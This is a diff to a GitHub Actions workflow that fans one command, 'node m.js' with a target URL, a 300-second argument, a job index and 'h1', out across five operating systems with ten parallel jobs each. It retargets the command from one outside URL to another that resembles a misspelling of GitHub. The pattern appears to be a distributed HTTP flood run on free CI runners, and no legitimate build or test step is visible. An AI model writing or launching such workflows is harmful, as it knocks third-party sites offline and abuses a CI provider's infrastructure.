@@ -11,15 +11,13 @@ jobs:
     runs-on: ${{ matrix.os }}
     strategy:
       matrix:
-        os: [ubuntu-latest, windows-latest, macos-latest]
-        node-index: ${{ fromJson('["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"]') }}
-        include:
-          - os: ubuntu-latest
-            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-          - os: windows-latest
-            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-          - os: macos-latest
-            node-index: [1, 2, 3, 4, 5]
+        os:
+          - ubuntu-20.04     # Ubuntu 20.04
+          - ubuntu-22.04     # Ubuntu 22.04
+          - windows-2019      # Windows Server 2019
+          - windows-2022      # Windows Server 2022
+          - macos-latest      # Latest macOS
+        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  # 10 parallel jobs per OS
 
     steps:
       - name: Checkout code
@@ -36,5 +34,4 @@ jobs:
           
       - name: Run Node script with parameters
         run: |
-          node m.js https://rapidis.gay/7778079525-ac6f591a-4fd1-4d9b-9748-9d3122f7d804 300 2 h1 ${{ matrix.node-index }} h1
-          
+          node m.js https://iithub.com/vrbrh921-glitch/Bdbs/edit/main/.github/workflows/main.yml 300 ${{ matrix.node-index }} h1
